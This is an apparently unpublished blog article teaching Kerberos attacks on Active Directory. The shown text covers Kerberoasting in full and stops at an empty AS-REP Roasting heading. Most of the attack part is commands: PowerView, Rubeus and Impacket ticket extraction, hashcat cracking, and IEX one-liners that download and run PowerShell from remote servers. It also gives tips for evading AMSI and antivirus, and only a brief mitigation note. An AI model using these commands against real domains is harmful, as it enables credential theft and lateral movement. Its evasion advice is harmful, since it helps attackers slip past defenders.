---
title: Kerberos Attacks in Depth
categories: [Windows,Kerberos,Active Directory,AS REP,Kerberoast,PowerView,Rubeus]
published: false
---

In this article I will discuss all the primary attacks on Kerberos, how to enumerate for them & finally how to exploit them using a wide range of toolsets. I will also try my best to outline how to carry out these attacks from both a domain joined Windows box & an external Linux VM i/e an attackers platform.



Below is a list of the outlined attacks.

- Kerberoast (Of Course?)
- AS-REP Roasting
- Kerberos User Enumeration & Brute Force
- Golden Ticket
- Silver Ticket
- PTT (Pass-The-Ticket)

## [](#header-2)Kerberoast



Kerberoasting is an extremely common attack in active directory environments which targets Active Directory accounts with the SPN value set. Common accounts with the SPN **(Service Principal Name)** set are service accounts such as IIS User/MSSQL etc. 



Kerberoasting involves requesting a Kerb Service Ticket (TGS) from a Windows Domain Machine or Kali Box using something like **GetUserSPN's.py**. The problem with **TGS** is once the the **DC** looks up the target **SPN** it encrypts the **TGS** with the **NTLM Password Hash** of the targeted user account.



## [](#header-3)From Windows



There are numerous ways to enumerate service accounts and find Kerberoast targets so I will cover a few below, both from Windows Machines & Linux Machines.



## [](#header-5)Powerview

The First will be PowerView.ps1 - If you have not heard of PowerView.ps1 by now and you are researching Kerberos attacks then you need to go back a little... 

PowerView is an insanely powerful **.ps1** created by Harmj0y which makes Enumerating & Exploiting AD Environments with PowerShell extremely easy. Even though Powershell is extremely monitored in this day and age by defenders it is still highly useful.

`https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1`



**Enumeration**

First let's import `PowerView.ps1` into Memory with 

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')
```



Of course `AMSI` will probably catch this on `WIN10 1803` but I will leave evasion upto yourselfs. There are numerous bypasses in my `h4cks` Repo and numerous out there online. `AMSI` is just string detection so it's easy to slip past.

Now with PowerView in memory on a **Domain-Joined Machine** we can simply run

```powershell
Get-DomainUser -SPN
```



The ```Get-DomainUser``` function also supports the `-Credential` switch which allows you to pass a seperate credential through. For ex.

```
$secpasswd = ConvertTo-SecureString 'pass' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('m0chan\user', $secpasswd)

Get-DomainUser -SPN -Credential $cred
```

That's it! It will return all users with SPN Value set. 



**Exploit**

Now with the target service accounts in our scopes we can actually request a ticket for cracking which couldn't be easier with `PowerView.ps1`

Just simply run the below command

```
Get-DomainSPNTicket -SPN <spn> -OutputFormat hashcat -Credential $cred
```

This will return a SPN Ticket encrypted with the `NTLM` hash of the target account. Bare in mind here I choose Hashcat over John as I use a Nvidia cracking rig but works way way better with Hashcat.

Now we can simply crack with something like

```
hashcat64.exe -a -m 13100 SPN.hash /wordlists/rockyou.txt
```

Of course this is as simple cracking attack as it's just against a simple wordlist but if this was in the real world you would through rule sets and much more probable wordlists into the mix.



**Mitigation / Defending**

The most effective technique of defending against this is of course to make sure Service Accounts have extremely long passwords, 32 of extremely high complexity.

In terms of detecting Kerberoast it can be quite tricky as it's normal activity for TGS to be requested however you can enable `Audit Kerberos Service Ticket Operations` under Account Logon to log TGS ticket requests.

However as this is normal operation you will get ALOT ALOT of `Event 4769` & `Event 4770` alerts



## [](#header-5)Rubeus



Second up we have Rubeus which is a relatively new tool developed and released by the wizards at SpectreOps. Without them the hacking community wouldn't be the same. 

Rubeus is effectively a Kerberos attack tool which we will cover a lot in this article that is developed in C#/.NET meaning it is a lot harder for defenders to detect it it's reflectively loaded using something like Cobalt's `execute-assembly` or `SILENTTRINITY.` You can also reflectively load it from PowerShell but I will be covering `.NET` in greater detail in a future article. 

`https://github.com/GhostPack/Rubeus`



**Enumeration**

Now by default I don't believe Rubeus has a `Enumerate` feature that simply enumerate user with the SPN Value set but truthfully that's not the hard part when it comes to Kerberoasting, with a little bit of Powershell / LDAP Magic you can find what your looking for. Below are some examples.

```powershell
get-aduser -filter {AdminCount -eq 1} -prop * | select name,created,passwordlastset,lastlogondate
```

```powershell
dsquery * "ou=domain controllers,dc=yourdomain,dc=com" -filter "(&(objectcategory=computer)
(servicePrincipalName=*))" -attr distinguishedName servicePrincipalName > spns.txt
```

There are more techniques out there such as `Get-DomainUser -SPN` as talked about above and a lot of other ways that I will leave to your imagination. 

Now we are armed with target accounts let's boot up `Rubeus`



**Exploit**



To get Rubeus you will actually need `Visual Studio 2017` or anything that can compile `.NET`. In my case I use Visual Studio and build myself an assembly. Luckily at the moment the default build of Rubeus is only detected by one AV vendor on Virus Total however if your AV is flagging it just change some strings and comments and rebuild the project and your AV will shut up.  That's the beauty of open-source C# / .NET Projects, much easier to circumvent anti-virus solutions.



Armed with out assembly/exe we can simply drop it on the target **Domain-Joined Machine** in the context of a domain user and start Roasting. 



Rubeus Github has an amazing explanation on all it's features and it's ability to target specific `OU's` `Users` etc etc so I will try not to copy it word-for-word but merely show it's capabilities. 



First we can try to Roast all Users in the Current Domain (May be Noise)

```powershell
PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast
```



Kerberoast All Users in a Specific OU (Good if Organization has all Service Accounts in a Specific OU)

```powershell
PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast /ou:OU=SerivceAcc,DC=m0chanAD,DC=local
```



This may generate a lot of Output so we can Output all the Hashes to a file for easier Management and Cracking.

```
/outfile:C:\Temp\TotallyNotHashes.txt
```



Roasting a Specific Users or SPN 

```powershell
PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast /user:mssqlservice

PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast /spn:MSSQLSvc/SQL.m0chanAD.local
```



There is also the ability to Roast users in a foreign trust domain providing the trust relationships allow you but you can check out the Rubeus Repo for full explanation on that. It's really cool. 



## [](#header-5)Invoke-Kerberoast.ps1



The final script I will talk about in the Windows Section is `Invoke-Kerberoast.ps1` which isn't nearly as powerful as `Rubeus` or `Powerview` hence why I will not split it up into Enumeration/Exploit like previous sections. 

`Invoke-Kerberoast.ps1`. can be Invoked and executed using the below `one-liner`

```powershell
PS C:\Temp > IEX(new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1");Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast

#Download Invoke-Kerberoast.ps1 into Memory (AMSI May Flag)
IEX(new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")

#Invoke-Kerberoast and Output to Hashcat Format

Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```





## [](#header-3)From Linux



Kerberoasting from Linux is a little but different as we are most likely not authenticated to the domain in anyway so will have to pass a stolen Kerberos ticket through for authentication or domain credentials.  

In my experience I have found Kerberoasting from a **Domain-Joined Machine** is way way easier and typically hassle free however sometime we don't have the option. 



To enumerate Users with `SPN` value set we can use one of `Impackets` great scripts `GetUserSPN's.py` 

*https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py*

If you haven't heard of Impacket by now it's a collection of python scripts for attacking Windows and has some seriously dangerous scripts in it's repo. 

Armed with `GetUserSPNs.py` and a already pwned `Domain Users` credentials we can simply run the below

```python
m0chan@kali:/scripts/ > python GetUserSPNs.py m0chanAD/pwneduser:pwnedcreds -outputfile hashes.kerberoast
```



This outputed file can now be sent to Hashcat to crack, there are alternative means to cracking on Linux but in all my time Hacking I have never once had a good time trying to crack on Linux. I find Hashcat on a Windows machine with NVIDIA cards is the best route (personally).



## [](#header-2)AS-REP Roasting



